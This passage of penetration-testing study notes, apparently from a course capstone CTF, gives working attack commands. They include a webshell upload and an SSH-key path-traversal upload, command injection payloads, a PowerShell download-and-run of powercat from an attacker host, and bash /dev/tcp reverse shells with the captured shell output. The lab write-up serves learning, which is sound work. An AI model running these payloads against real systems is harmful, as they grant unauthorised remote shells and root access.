@@ -557,3 +557,146 @@ While having your listener running on your machine:
 ```bash
 nc -nlvp 4444
 ```
+
+### Windows reverse shell using RFI (capstone ctf)
+Ran service discovery against `192.168.223.192` with:
+`sudo nmap -sS --script http-title 192.168.223.192`
+which identified IIS Windows Server on `80/tcp` ad `8000/tcp`
+8000 was the main website and contained an upload form. Uploaded files where uploaded to the 80 webroot. 
+
+Kali comes with some webshells :
+- `ls /usr/share/webshells/aspx` -> `cmdasp.aspx`
+- `cat /usr/share/webshells/aspx/cmdasp.aspx` (ASP.NET webshell that executes commands via `cmd.exe`)
+upload the cmdasp.aspx webshell and access it on port 80.
+
+Encoded a PowerShell reverse shell command to Base64 like in [[Week 2#Upload vulnerabilities]], and started your listener on Kali:
+`nc -nvlp 4444`
+
+After the reverse shell connected, navigated the IIS web root on the target:
+
+### upload without executable options
+If the upload endpoint is writable and SSH is available, you can use it to place a public key into the target's authorized keys and then log in over SSH.
+
+```bash
+# 1) Upload a file with curl
+curl -X POST -F 'myFile=@hosts.txt;filename=hosts.txt' 'http://mountaindesserts.local:8000/upload'
+
+# 2) If the app writes somewhere restricted, use ../ to change the target path
+curl -X POST -F 'myFile=@dessert.pub;filename=../../../../../../../root/.ssh/authorized_keys' 'http://mountaindesserts.local:8000/upload'
+
+# 3) Generate a key pair and upload the public key
+ssh-keygen -f dessert
+curl -X POST -F 'myFile=@dessert.pub;filename=../../../../../../../root/.ssh/authorized_keys' 'http://mountaindesserts.local:8000/upload'
+
+# 4) Connect with SSH
+ssh -p 2222 -i dessert root@mountaindesserts.local
+```
+
+The idea is simple: use curl to upload a file, use path traversal with ../ to place it in a useful location, and then use the uploaded public key to authenticate over SSH.
+
+## Command injection to pop a shell
+If the app filters the input, try prepending a harmless prefix such as `git;` so the server accepts the request and still executes the real payload after the separator.
+Useful test payloads:
+
+```bash
+curl -X POST --data 'Archive=git%3Bid' 'http://TARGET/archive'
+curl -X POST --data 'Archive=git%3Bdir' 'http://TARGET/archive'
+```
+
+- If `git;` works, use it as the wrapper for the actual command:
+
+```bash
+curl -X POST --data 'Archive=git%3B<real command here>' 'http://TARGET/archive'
+```
+
+In some cases `gitgit;...` also worked, but the first command's output was not visible, so `git;...` is the cleaner choice.
+
+```bash
+# PowerShell check
+curl -X POST --data 'Archive=gitgit%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' 'http://192.168.223.189:8000/archive'
+```
+
+handy snippet, published by PetSerAl that displays "CMD" or "PowerShell" depending on where it is executed.
+
+```text
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+```
+
+If that returns Powershell, use the PowerShell Empire / PowerCat payload below.
+
+```bash
+# host payload
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+python3 -m http.server 8080
+
+# listener
+nc -nvlp 4444
+
+# trigger
+curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<YOUR_IP>:8080%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<YOUR_IP>%20-p%204444%20-e%20powershell' 'http://TARGET/archive'
+```
+
+If PowerShell is not available, switch to a non-PowerShell reverse shell payload instead.
+
+### Linux reverse shell
+
+```bash
+└─$ curl -X POST --data 'Archive=gitgit%3Bid' 'http://192.168.223.16/archive'
+Repository successfully cloned with command: gitgit;id and output: uid=1000(stanley) gid=1000(stanley) groups=1000(stanley),27(sudo)
+└─$ curl -X POST --data 'Archive=gitgit%3Bls' 'http://192.168.223.16/archive'
+Repository successfully cloned with command: gitgit;ls and output: css
+fonts
+img
+index.html
+js
+main
+start.sh
+                                                                                                                                                                                       └─$ curl -X POST --data 'Archive=gitgit%3Bbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.249%2F4444%200%3E%261%22' 'http://192.168.223.16/archive'
+Repository successfully cloned with command: gitgit;bash -c "bash -i >& /dev/tcp/192.168.45.249/4444 0>&1" and output:                                                                                                                                                                                                          
+
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.249] from (UNKNOWN) [192.168.223.16] 46326
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+stanley@00f986a16127:/app$ ls
+ls
+css
+fonts
+img
+index.html
+js
+main
+start.sh
+              
+```
+
+#### capstone ctf linux
+Vulnerable web application that has a command injection vulnerability in the login form. Python application.
+We can get to some of the source by ommitting some parameter:
+```python
+   if request.method == 'POST':
+            if request.form['username'] != 'N@NdkWzmN@NdkWzmN@NdkWzm' or request.form['password'] != 'N@NdkWzmN@NdkWzmN@NdkWz!!!!!!###!!!!!m':
+                ffa = request.form['ffa']
+                out = os.popen(f'echo "{ffa}"').read()
+                if out == (random_string+random_string2):
+                    output = "FFA was correct!"
+                else:
+```
+
+Common first payloads to try for command execution in this style are:
+
+";id;#
+"$(id)" (if command substitution is possible in that quoting context)
+";uname -a;#
+
+
+```bash
+curl -s 'http://192.168.223.16/login' \
+  -X POST \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode "username=test" \
+  --data-urlencode "password=test" \
+  --data-urlencode 'ffa=";sudo /bin/bash -c '\''bash -i >& /dev/tcp/192.168.45.249/4444 0>&1'\'';#'
+```
+use `sudo su` to get root and then `cat /root/flag.txt` to get the flag.
